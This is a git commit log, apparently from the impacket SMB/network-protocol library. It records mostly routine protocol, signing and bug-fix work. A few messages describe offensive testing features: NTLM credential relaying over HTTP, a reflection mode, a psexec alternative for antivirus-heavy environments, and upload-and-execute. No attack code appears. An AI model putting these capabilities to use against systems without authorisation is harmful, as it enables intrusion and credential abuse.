Date:   Thu Sep 5 14:16:40 2013 +0000

    Copyright notices for new things

commit e521d145bd7e2e3d53bffe8f6554a7c5109d9d55
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 19:48:13 2013 +0000

    Plug-in decoders for eap and wps.

commit 53203f53438fe6445b59877856ef6aa9481d6337
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 19:21:43 2013 +0000

    ProtocolPackets for eap and wps. Including some basic tests.

commit cccbc59423696f7ef2b5b1d24b2c9c626dd21aef
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 19:20:50 2013 +0000

    Fixing PYTHON PATH in .pydevproject

commit bb539d0f3970bae3978fbc6cff4dbbaafc0a575a
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 18:17:39 2013 +0000

    Adding pydev project information

commit 6d0f9bd293f755dc67da3768d1012ab9b30a13f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 15 21:31:37 2013 +0000

    TDS/SSL support should work now. Automatically detected by the library.

commit eb8b7fd30ea5d41652305edb09d4fdea6384e738
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 15 15:08:39 2013 +0000

    Initial SSL support for TDS. This is needed if the target SQL Server is configured with Force Encryption == Yes

commit 60151cf14ec7ad7add8a33b10bfdc199e2ad7c8d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 5 22:25:53 2013 +0000

    Adding third argument to ConfigParset.set() method.. Looks like it's needed on some Python versions.

commit 65abbc7f44f90d53a7b52b1d4bd721faf3a0a35b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 28 21:17:46 2013 +0000

    Sync with CORE internal repository

commit be0851486c6793909fd50ce8216a85167de55b36
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 28 16:37:56 2013 +0000

    Sync with CORE internal repository

commit f1d8f3e8365eedf46680166eb29e21d154cbeee7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 28 16:13:29 2013 +0000

    Sync with CORE internal repository

commit f0a06a147bac3e8bae19db4b1e24e71be893427f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 19 16:15:32 2013 +0000

    Just in case an *SMBSERVER is sent, let's get rid of it and put the remote_host address

commit 62cce192d3e86c73319f613ed11f33f250aff62c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 18 18:48:16 2013 +0000

    Fix for http://code.google.com/p/impacket/issues/detail?id=29

commit 1861c4f23e6f20f13fe723ab051fdb819aa08715
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 14 14:47:15 2013 +0000

    Fixes wrong decription in parameters

commit 994a5b70ef13aa9de142c63b7d2d313d960c4aa1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 31 15:53:50 2013 +0000

    fixing typos and escape characters for \x00.. as reported at http://code.google.com/p/impacket/issues/detail?id=27

commit 9d2c14e0d7943988b0b3698eef13c337473477e0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 29 00:38:30 2013 +0000

    dded option -c that would upload a file and execute it. Testing needed

commit 8fa4eec76b15e29d5a442026e5e4067c1c43dd09
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 17 19:30:16 2013 +0000

    Fix a bug in polling_read that would make the function to wait indefinitely given some circumstances.
    Fix proposed by akfullfo, check: http://code.google.com/p/impacket/issues/detail?id=26

commit c75eaebdb31e5a69f5a7c4506a00de559c587d0b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 14 23:03:31 2013 +0000

    Not using *SMBSERVER anymore, instead, using the host IP address

commit 6beb278713a767e655cb3f3f8e237d4fb679ef11
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 14 23:00:48 2013 +0000

    Fixed bug that would send *SMBSERVER when connecting against a Windows machine with SMB1 only, and also specifying remoteName = '*SMBSERVER' when calling SMBConnection. This usually shouldn't happen but I'm sure there are still old code out there specifying *SMBSERVER as the remote name. In fact, smbclient.py does that (my faul )

commit c6c1ccd2916c2019840e06a8db3c0ca281246819
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 13 18:16:52 2013 +0000

    VLAN tagging (IEEE 802.1Q and 802.1ad) support for ImpactPacket.
    This basically merges the patches and unit test sent by dan.pisi.
    
    Check http://code.google.com/p/impacket/issues/detail?id=24 for more details.

commit 70757ee97c21708b451a3179bec846fd2e81c980
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 6 16:58:09 2013 +0000

    Going back again to a development version

commit 1305350d688868a0872339ad82c0c1870636ee9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 6 16:05:14 2013 +0000

    Updates version number before releasing

commit 01c3a1fd37c0ce18510ebdc5dc877062d670f83c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 5 20:56:20 2013 +0000

    Moving the debug message to the handler constructor so we don't log it for every request.

commit d0c8b4c377cfbc520781708a5b156dc394d211ee
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 5 15:39:19 2013 +0000

    Fixes on NTLMAuthNegotiate to better handle situations where VERSION field is sent by the client, plus correctly setting the right flags if hostname and domain are provided.

commit b4827384cd8293ed52714eca0674568cf2a4f224
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 4 21:44:22 2013 +0000

    Removed debug message

commit d7b174c447e0d109eee71a4fed8217c9ae3895b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 4 21:42:48 2013 +0000

    Now we also bind to HTTP and relay those credentials to whatever target specified

commit cf7841b35bb430a7d921a6a12fb6cb206de2f33c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 1 00:14:12 2013 +0000

    We were logging the wrong target IP when saying whether or not authentication worked.

commit 6f5a4d096e1cc4ffe3ef6491fd8490e399597b3c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 1 00:04:16 2013 +0000

    We don't need this anymore

commit fb40ee51eaf31c86fa5255aebd9c10eda39d9509
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 1 00:02:40 2013 +0000

    And moving it here

commit 7b64e4b469444169b80200770208c0509eca3f9c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 23:57:09 2013 +0000

    We don't need to have this script on a separate directory anymore

commit c292f77e8bda178309eef0223c0210e2f982e8ef
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 23:56:37 2013 +0000

    Getting rid of the need of a smb.conf file. We're setting the required configuration parameters programmatically

commit ed906102e8a9cbcbccd2667a99d59b6782f5abeb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 19:17:17 2013 +0000

    Some extra fields completed

commit 8a56382f413b7b21e707ae661d75adb79a9da24e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 15:47:36 2013 +0000

    correct the name of the package

commit d9c62492d54c72a706d0c746d799041e5cdf7342
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 14:59:50 2013 +0000

    Clarified requirements

commit 9c6af7834f54fa6ffcffe61be173979aa6cca6ac
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 29 16:27:45 2013 +0000

    Another alternative to psexec. Less capabilities but might work on tight AV environments.

commit 92e6b8b734321f960986420aa3d957a4856a929e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 25 22:07:46 2013 +0000

    Fixup imports, requiring it comes from impacket

commit 4da7746638dfe67b22c13860d3a78690d8255028
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 24 02:19:13 2013 +0000

    class.__str__ calls class.getData(), hence, changing stuff must happen there.

commit 82a14b22366c6881c7bbf35a1f69761b3b58895c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 16 17:52:48 2013 +0000

    Added impacket.examples so the installation script install all the required files

commit 8b6e35460f8890c514e5564a79035acf630f9db0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 9 18:40:15 2013 +0000

    Changed smbconnection so it automatically detects what SMB version is supported on the other side, instead of doing the old try: except: workaround that would take longer against servers supporting only SMBv1.
    See [MS-SMB2] section 1.7.
    
    In order to do this we had to craft the SMB_NEGOTIATION packet at the SMBConnection level, and then pass the NetBIOSSession to the smb3/smb layer.

commit 743b55c75dc7b20a02e00a854fe6031e3d82abd2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 9 14:11:32 2013 +0000

    Fix a typo in set_icmp_gwaddr() as reported by dirdi.

commit aa89d7717e5eebe87aadeab321393a9c90d0a587
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 8 21:09:46 2013 +0000

    Replace the reserved field expecting just zero values, to expect anything.. in any case we're not using them.. and some random smb servers might return non zero values

commit 6a84516583ccf5dbc78e5b33ff3bec67bf301ee6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 30 16:31:08 2012 +0000

    Fixed os.mkdir() not being inside a try/catch .. Triggering an un handled exception when trying to create a directory inside a readonly filesystem (for example)

commit 1ec29aa5df9d7081fa823329fe7c7780c7b7147d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 20 19:05:51 2012 +0000

    domain was missing when setting credentials for a DCERPC call

commit fac965731a328741ae34053bcec9c9c1561bf99f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 15 23:37:44 2012 +0000

    Fixes bug reported by Renaud Dubourguais that would make the domain/lmhash/nthash to be discarded when calling this method

commit 369dd3b69733ea6c6703c535162c5e8a27ffe5c5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 4 15:58:37 2012 +0000

    Missing space in EncryptionKey generation, it should be 'ServerIn \x00'.
    
    Reported by Amir Sela

commit 3fb6b86693d472761ff5ef667b5a970d0bcdc712
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 22 14:42:26 2012 +0000

    Don't try to read a 0 bytes file if we alreay know so..

commit 87c96be3e4a6e440c612c551d070d1d8b7aae3d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 22 14:41:12 2012 +0000

    Log the exception instead of printing it out

commit 8b881cef15ff61e4171700d48cecc936de470cdc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Nov 19 16:54:24 2012 +0000

    When answering a CREATE_DIRECTORY request, check it starts with '/' before stripping it.

commit 2adb9e477f6c065618e264db73403206ba4b4ef2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 22 16:55:10 2012 +0000

    Fixes http://code.google.com/p/impacket/issues/detail?id=20

commit 1907cc7a8072c7326d6a8584aa09a01bb69b97c8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 7 15:32:34 2012 +0000

    SMBBackwardCompatibilityTransport needs the pipe to connect to

commit b01a6ece417fbb81f1e8d55a041263b933631361
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 6 22:18:17 2012 +0000

    No more share list through LANMAN.. now using RPC by default

commit 15de0e039b118b33d52daf804667f341fd5bc283
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 6 22:10:44 2012 +0000

    Unicode support for smbserver.
    It will advertise itself supporting Unicode, but should also work if the client does not.
    Still pending testing

commit 4037a5bd2f830545dba2ad6383b5dd0b2cd3a97c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 6 19:00:11 2012 +0000

    In REFLECTION mode, downgrade to standard security. This seems to be more effective on certain OS versions

commit b9507e47b5c3b68b637ad526c714098eb0ab86e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 4 20:33:24 2012 +0000

    Deny anonymous logon on standard security auth too

commit a298b54ce99605ae3e69eb62a94343b485a70997
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 4 20:28:50 2012 +0000

    _dialects_data['Payload'] = '' moved up 'cause it's needed in case there's an encrption key

commit 67f7f4fec04f6f6e5a774dad7b78618e39b29d1d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 4 16:15:23 2012 +0000

    1) Fixup imports
    2) Send LOGON_FAILURE if the client attempts to connect as anonymous

commit 0eca55ea429e918c46447c24c30555bdec54dc26
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 3 19:05:34 2012 +0000

    Imports fixup

commit 4dced7beb8359b9088f9cce3c5667c2b056bcc7b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 19 20:47:41 2012 +0000

    Fixes http://code.google.com/p/impacket/issues/detail?id=19.
    
    I think I found a clever way to detect whether the data sent is standard security or extended security w/o checking the SMB Flags

commit 7e1d1d2288ed352ea93cebe32cb7896b5911d068
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 13 22:06:16 2012 +0000

    Missing setting the ChallengeLength when accepting standard security/no encryption key authentication.
    
    Fixes: http://code.google.com/p/impacket/issues/detail?id=17

commit 3450e59a2d4297dd5851ca7af95c5e4f67b6a72c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 13 14:39:12 2012 +0000

    Checking data received trying to detect the connection is closed and not throwing an exception

commit 81e603ef6da9fad9c669a2689773b40c667a24cd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 10 21:31:21 2012 +0000

    Changing the scope of the classes' attributes to make it easier subclassing

commit e610e70aa25047294e99c2fa48734117f85e73c8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 10 19:40:25 2012 +0000

    Fixed http://code.google.com/p/impacket/issues/detail?id=14 .
    There were other instances where id() was used in this way.. provoking an overflow.

commit 2a8b58cf02fd7fd4a24c2adf1cd9198f88555802
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 7 15:15:43 2012 +0000

    Although [MS-CIFS] defines SMB_COM_WRITE_ANDXas:
    
    SMB_Parameters{
    [..]
    Reserved;
    DataLength;
    DataOffset; -> Offset from the begining of the SMB Packet to the data
    OffsetHigh (optional);
    }
    
    SMB_Data
    {
    USHORT ByteCount;
    Bytes
    {
    UCHAR Pad;
    UCHAR Data[DataLength];
    }

commit f825155642e7a3cb77270fbb981a4f3cd3295ff1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 22:46:08 2012 +0000

    Fixes http://code.google.com/p/impacket/issues/detail?id=13 reported by Bryan.
    socket should use send(), not write().

commit 02c3d7b75151d8fa8c8ca2d59a4d3029513672b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 04:26:22 2012 +0000

    Reading the StdErr pipe using readFile() now.. Makes it work

commit e4ea903f3d7782f1b085baa181fd93e2bc3bee3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 04:02:02 2012 +0000

    ChallengeLength must be treated different depending on extended security on/off:
    
    ChallengeLength (1 byte): When the CAP_EXTENDED_SECURITY bit is set, the server MUST set this value to zero and clients MUST ignore this value.
    
    and when CAP_EXTENDED_SECURITY is not set:
    ChallengeLength (1 byte): This field MUST be 0x00 or 0x08. The length of the random challenge used in challenge/response authentication. If the server does not support challenge/response authentication, this field MUST be 0x00. This field is often referred to in older documentation as EncryptionKeyLength.

commit e6a9c5cd3c84dc839844835d476cc4e527870805
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 03:06:04 2012 +0000

    We're not relying on client's capabilities based on the negotiate packet, but still looking at the Flags2 to decide whether or not extended security is supported.
    Fixes http://code.google.com/p/impacket/issues/detail?id=12 reported by Bryan

commit 5a8a6d1f2d4b749d23f30de8f6e08e7dcf39ca3a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 4 02:03:28 2012 +0000

    Adding tests for all dialects

commit 9e276c18b0f0355453f0243500a96a7e9f983574
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 4 01:33:09 2012 +0000

    typo

commit 031fc5e25415e23c520c0772facd3e3332ad0c85
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 4 01:27:34 2012 +0000

    Completing some aliases

commit f999d5336588bb2bf371a2ef8e3ca4b00c607cff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 30 20:25:03 2012 +0000

    When a stringbinding returned by the portmapper has '0.0.0.0' we should replace it by the servers IP address

commit 0306a10d24bba2cb0adb13317f6a6e37579b7834
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 28 12:39:56 2012 +0000

    If login is unsuccessful, clean all the internal variables in case user wants to authenticate again within the same connection

commit 1938dcf0d6fff52d10d861b9f8508704c4ff4ce0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 22:10:06 2012 +0000

    Initialization of self._NetBIOSSession to None. Important if something goes wrong before the connection is made

commit 7909c3292033a174ce2136c49b26fe6fc85b96bc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 22:09:27 2012 +0000

    global dialect variable added, once the first SMB connection is made, we hold the chosen dialect there, speeds up the process for w2k and xp

commit 53dfafc0f5ea2c26fd1f8c70cbd1b11262325d75
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 19:11:12 2012 +0000

    Test case for SMBConnection, still lots to do to test things right

commit 41623744c5373f19cd30b5f04631492e60d98d55
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 19:09:24 2012 +0000

    Porting smbclient to SMBConnection methods

commit f5eb286882f29d8d8950cb9aabda0314642b6212
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:24:22 2012 +0000

    Ported to the SMBConnection concept. Much simpler and SMB version independent. It will pick the best SMB Version when connecting

commit 633127140d6b642012bd0f1503e7d32fc0b67277
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:21:24 2012 +0000

    1) SMBTransport now uses SMBConnection methods.
    For backward compatibility it will try to detect if a SMBServer (not SMBConnection) was sent as parameter and will return a SMBBackwardCompatibilityTransport() (old behaviour).
    2) Exporting a method preferred_dialect() if you want to specify the specific SMB dialect you wanna use

commit 94bdb870f064d700df56df720e8be6e8c28b6d2c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:18:10 2012 +0000

    This helper library now works with the SMBConnection methods. If for some reason it receives an SMBServer as parameter, it will convert it to a SMBConnection

commit a10e5f8f2953d54df068700249a2d887b2707a3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:16:21 2012 +0000

    Just a clarification

commit ef081f731119e9edc1789157754836a75447fa10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 17:00:28 2012 +0000

    1) Allow an existing connection to be sent to the constructor
    2) writeNamedPipe uses writeFile instead of TransactNamedPipe()

commit 86fbb1e8b240acb4ac03cfe0efa25f879f5e2bb5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 16:59:02 2012 +0000

    waitAnswer on write()

commit 4f0f4e5fb00f7780234caa54300b90c727df09bc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 22:05:24 2012 +0000

    setTimeout() added

commit ec3581c8963d21bf086218ecea67d85a982f708d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 20:32:19 2012 +0000

    1) openFile opens the file for READ/WRITE by default
    2) Fixed bug in writeNamedPipe()

commit 570bb2414f4dce34befd6a3ab9b6c2bad2754ea6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 19:56:58 2012 +0000

    1) Added transactNamedPipeRecv()
    2) Fixed bug in openFile

commit 658d9e787ea6c6df3b31d2c499d394a83865f40c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 18:33:02 2012 +0000

    1) Added rename()
    2) Added readNamedPipe()
    3) Added writeNamedPipe()
    4) Fixed transactNamedPipe()
    5) Added listShares()

commit d15a11c2784fe07a548f2756801e39e47bd34f0c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 18:30:59 2012 +0000

    replace should be done against old_path and new_path

commit 5d75ab67bb8478fcb36d090b201da5c55e4ea7f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 18:23:35 2012 +0000

    1) Added SMB_SET_INFO
    2) Added rename() higher level function

commit 95f2c02d09e6b82c994b504d6c3d717e23a06d5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 17:06:06 2012 +0000

    WaitNamedPipe now accepts timeout

commit b39527293d16d6f579545bc7d2a9b4f6c87e2c57
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 16:53:51 2012 +0000

    we call writeFile for SMB/1/2/3 instead of write_andx. We have to take care of the amount of data that can be written if signing is enabled

commit 4405cdc180322b639a2ed321cba110552b95479b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 16:52:58 2012 +0000

    writeFile() added

commit 6dd5cd7b505b289476b8b039948a03c23d0906bb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 16:52:38 2012 +0000

    writeFile() added

commit b08c37bb71e270c238831aa520a8888b0c716413
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 00:50:45 2012 +0000

    Removing a debug msg

commit 57e0a87d503c3ae73950d1a110cbb8c253a5ba05
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 19 23:32:25 2012 +0000

    First version of smbconnection, not yet finished:
    # Wrapper class for SMB1/2/3 so it's transparent for the client.
    # You can still play with the low level methods (version dependant)
    # by calling getSMBServer()

commit a50394e80333328045e685b2894cc4ef554b569d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 19 23:14:12 2012 +0000

    1) preferredDialect added to the SMB3 class.__init__. Allowing to select an specific dialect to use
    2) getDialect() added
    3) backward alias get_server_os added
    4) del() added

commit 84670d2a2fbfc11802100874fa089902dc87033d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 19 23:11:47 2012 +0000

    getDialect() added
    replacing '/' for '\\' for all the functions that deal with pathnames

commit d12d7196ec4bbd9eacc7fd1b71a2f1187d3fd5c3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 21:31:43 2012 +0000

    Sign also for SMB2_DIALECT_002

commit 6f0791509e6cfd3f0f5c9a50d467294cb09d978e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 14:06:40 2012 +0000

    Added useTimeout() and remove()

commit d43162f9f393cced45a340f7a0e983992c2dd749
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:38:59 2012 +0000

    NT_STATUS errors are now STATUS errors

commit ae5194fc8966b6cae54d2211af96c5e8d176dd0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:30:38 2012 +0000

    Removing all the spnego stuff and importing spnego.py

commit 1cadbcad06a2214757563b63133323dd911cb82d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:29:45 2012 +0000

    Using spnego.py instead of smb.py for the spnego functions

commit 59f47b2ccba857adafce903069e5ce0658a5787a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:20:52 2012 +0000

    Using spnego.py instead of smb.py for the spnego functions

commit 677f737261c5f5310368d53de6d2bc46d2668d67
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 01:39:04 2012 +0000

    SMB3 signing now working if the server enforces it. The rest of the key derivations are also calculated, needed whenever we implement encryption

commit 1954029cdffc1e30fcad39e1ccdd37de95377837
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 01:04:03 2012 +0000

    Extra crypto stuff needed for SMB3 signing and encryption:
    #   RFC 4493 implementation (http://www.ietf.org/rfc/rfc4493.txt)
    #   RFC 4615 implementation (http://www.ietf.org/rfc/rfc4615.txt)
    #
    #   NIST SP 800-108 Section 5.1, with PRF HMAC-SHA256 implementation
    #   (http://tools.ietf.org/html/draft-irtf-cfrg-kdf-uses-00#ref-SP800-108)
    #

commit 5c63d6be065faca3c1c3eb98a1ea88762173369f
